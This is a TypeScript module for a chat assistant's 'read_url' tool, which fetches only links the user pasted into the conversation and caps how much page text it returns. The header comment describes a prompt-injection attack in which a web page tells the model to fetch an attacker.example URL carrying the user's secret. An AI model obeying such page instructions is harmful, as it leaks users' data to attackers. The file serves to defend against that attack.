import "server-only";

import { jsonSchema, tool, type ToolSet } from "ai";
import { definitionTokensOf, type ChatReadPart } from "@/lib/chatToolLoop";
import { extractResearchDocument, RESEARCH_READABLE_MEDIA_TYPES, type ResearchExtracted } from "@/lib/researchEngineDocuments";
import { fetchResearchUrl, type ResearchFetchResult } from "@/lib/researchEngineFetch";
import { frameWebPageText, URL_READ_RULES } from "@/lib/untrustedToolText";
import { sanitizeWebSearchCitations, type WebSearchCitation } from "@/lib/webSearchCitations";

/**
 * read_url: the model reads a web page the user pasted into the conversation.
 *
 * Off unless `CHAT_URL_READING_ENABLED` is exactly "true".
 *
 * ## What is deterministic
 *
 * Fetching reuses the Research reader (`lib/researchEngineFetch.ts`) and its
 * document extractor (`lib/researchEngineDocuments.ts`) as they are: https
 * only, public DNS answers only, the socket pinned to the address that was
 * checked, every redirect re-validated, no cookies or credentials, bounded
 * size and time. Nothing here is a second crawler or parser.
 *
 * What this module adds is the part a chat has and a Research run does not:
 * the address comes from a model's tool call. A page can tell the model to
 * "fetch https://attacker.example/?q=<the user's secret>", which is data
 * leaving through a GET. So the tool accepts **only a link the user wrote**
 * into this conversation (`allowedUrls`, built from the user's own messages by
 * the caller). Any other address is refused before any network call, and the
 * refusal lists the user's links so the model can recover. Links found inside
 * a page are never followed.
 *
 * Reads per turn, characters per page and characters per turn are capped; the
 * caps are the reservation the loop is priced on (`lib/chatToolLoop.ts`).
 * Fetching costs no provider money, so a read has no price of its own.
 */

export const CHAT_URL_READING_ENV = "CHAT_URL_READING_ENABLED";

export const chatUrlReadingEnabled = (env: Record<string, string | undefined> = process.env) =>
    env[CHAT_URL_READING_ENV] === "true";

export const CHAT_URL_READ_LIMITS = {
    /** read_url calls in one turn, refusals included. */
    reads: 3,
    /** Characters of one page the model is given. */
    pageCharacters: 20_000,
    /** Characters of page text one turn may return: the reserved allowance. */
    turnCharacters: 40_000,
    /** Response bytes fetched for one page (Research allows 8 MiB). */
    maxBytes: 3 * 1024 * 1024,
    /** Distinct links of the user's that are remembered for a turn. */
    maxUserLinks: 40,
} as const;

export const CHAT_URL_READ_MAX_STEPS = 4;

/* ------------------------------------------------------------ user links */

const URL_IN_TEXT = /https?:\/\/[^\s<>"'`\\]+/giu;
const TRAILING_PUNCTUATION = /[.,;:!?'"\u2019\u201d\u3002\uff0c\uff01\uff1f\u3001]+$/u;

/** A user link in the one form it is compared in: https-or-http URL, no fragment. */
export function canonicalUserLink(value: string): string | null {
    try {
        const url = new URL(value.trim());
        if (url.protocol !== "https:" && url.protocol !== "http:") return null;
        url.hash = "";
        return url.href;
    } catch {
        return null;
    }
}

/**
 * The links in the user's own messages, newest first, deduplicated.
 *
 * Prose sticks punctuation and, in Korean or Japanese, particles to a pasted
 * link, so each match also yields the forms with that stripped: trailing
 * punctuation, an unbalanced `)`, and everything from the first non-ASCII
 * character on. A form that is not what the user meant is harmless, because
 * it is still text the user wrote.
 */
export function userLinksFromMessages(userMessages: readonly string[]): string[] {
    const found = new Set<string>();
    const add = (candidate: string) => {
        const canonical = canonicalUserLink(candidate);
        if (canonical) found.add(canonical);
    };
    for (let index = userMessages.length - 1; index >= 0; index--) {
        for (const match of userMessages[index]!.matchAll(URL_IN_TEXT)) {
            let raw = match[0];
            add(raw);
            const ascii = raw.search(/[^!-~]/u);
            if (ascii > 0) {
                raw = raw.slice(0, ascii);
                add(raw);
            }
            raw = raw.replace(TRAILING_PUNCTUATION, "");
            add(raw);
            while (raw.endsWith(")") && (raw.match(/\(/g)?.length ?? 0) < (raw.match(/\)/g)?.length ?? 0)) {
                raw = raw.slice(0, -1).replace(TRAILING_PUNCTUATION, "");
                add(raw);
            }
            if (found.size >= CHAT_URL_READ_LIMITS.maxUserLinks) return [...found];
        }
    }
    return [...found];
}

/* ------------------------------------------------------------------ tool */

export type ChatUrlReadState = "page_reading" | "page_unavailable" | "done";

type FetchPage = (url: string, signal: AbortSignal, options: { maxBytes: number }) => Promise<ResearchFetchResult>;
type ExtractPage = (bytes: Buffer, mediaType: string, baseUrl: string) => Promise<ResearchExtracted>;

export function buildChatUrlReadPart(input: {
    /** Canonical links from `userLinksFromMessages`; the only addresses the tool will fetch. */
    allowedUrls: readonly string[];
    signal: AbortSignal;
    onState?: (state: ChatUrlReadState) => void;
    /** Tests inject the network edge; production uses the Research reader. */
    fetchPage?: FetchPage;
    extractPage?: ExtractPage;
}): ChatReadPart {
    const fetchPage: FetchPage = input.fetchPage ?? ((url, signal, options) => fetchResearchUrl(url, signal, options));
    const extractPage: ExtractPage = input.extractPage ?? extractResearchDocument;
    const allowed = new Set(input.allowedUrls);
    const citations = new Map<string, WebSearchCitation>();
    let calls = 0;
    let returnedChars = 0;
    const limitReached = {
        status: "limit_reached",
        note: "The page reading allowance for this answer is used up. Answer from what you have and say which links were not read.",
    };

    const tools: ToolSet = {
        read_url: tool({
            description: `${URL_READ_RULES}\nPass the link exactly as the user wrote it.`,
            inputSchema: jsonSchema<{ url: string }>({
                type: "object",
                properties: { url: { type: "string", minLength: 8, maxLength: 2048 } },
                required: ["url"],
                additionalProperties: false,
            }),
            execute: async ({ url }) => {
                input.signal.throwIfAborted();
                if (++calls > CHAT_URL_READ_LIMITS.reads) return limitReached;
                const target = canonicalUserLink(String(url));
                if (!target || !allowed.has(target)) {
                    // Refused before any network call. The user's own links
                    // are text the model already has, so listing them is safe.
                    return {
                        status: "refused",
                        reason: "not_a_link_the_user_wrote",
                        note: "Only a link the user pasted in this conversation can be read. Tell the user if they need to paste the link.",
                        userLinks: [...allowed].slice(0, 10),
                    };
                }
                input.onState?.("page_reading");
                const fetched = await fetchPage(target, input.signal, { maxBytes: CHAT_URL_READ_LIMITS.maxBytes });
                if (!fetched.ok) {
                    input.onState?.("page_unavailable");
                    return { status: "unavailable", reason: fetched.reason, url: target, note: "Say that this page could not be read. Do not guess its content." };
                }
                if (!RESEARCH_READABLE_MEDIA_TYPES.has(fetched.mediaType)) {
                    input.onState?.("page_unavailable");
                    return { status: "unavailable", reason: "unsupported_content", url: target, note: "This kind of file cannot be read as a page." };
                }
                const extracted = await extractPage(fetched.bytes, fetched.mediaType, fetched.finalUrl);
                if (!extracted.ok) {
                    input.onState?.("page_unavailable");
                    return { status: "unavailable", reason: extracted.reason, url: target, note: "Say that this page could not be read. Do not guess its content." };
                }
                const room = CHAT_URL_READ_LIMITS.turnCharacters - returnedChars - 1_000;
                if (room <= 0) return limitReached;
                const limit = Math.min(CHAT_URL_READ_LIMITS.pageCharacters, room);
                let text = extracted.text.slice(0, limit);
                if (/[\uD800-\uDBFF]$/u.test(text)) text = text.slice(0, -1);
                const clipped = extracted.truncated || extracted.text.length > text.length;
                const framed = frameWebPageText(text, { title: extracted.title, url: fetched.finalUrl });
                returnedChars += framed.length;
                const [citation] = sanitizeWebSearchCitations([
                    { url: fetched.finalUrl, title: extracted.title, sourceProvider: "url_read" },
                ]);
                if (citation) citations.set(citation.url, citation);
                input.onState?.("done");
                return {
                    status: clipped ? "partial_read" : "ok",
                    ...(clipped ? { note: "Only the start of this page fit in this answer's allowance. Say so; do not claim the whole page was read." } : {}),
                    url: target,
                    data: framed,
                };
            },
        }),
    };

    return {
        tools,
        definitionTokens: definitionTokensOf(tools, URL_READ_RULES),
        // A character bound is a conservative token bound for returned page text.
        resultInputAllowance: CHAT_URL_READ_LIMITS.turnCharacters,
        maxSteps: CHAT_URL_READ_MAX_STEPS,
        citations: () => [...citations.values()],
    };
}
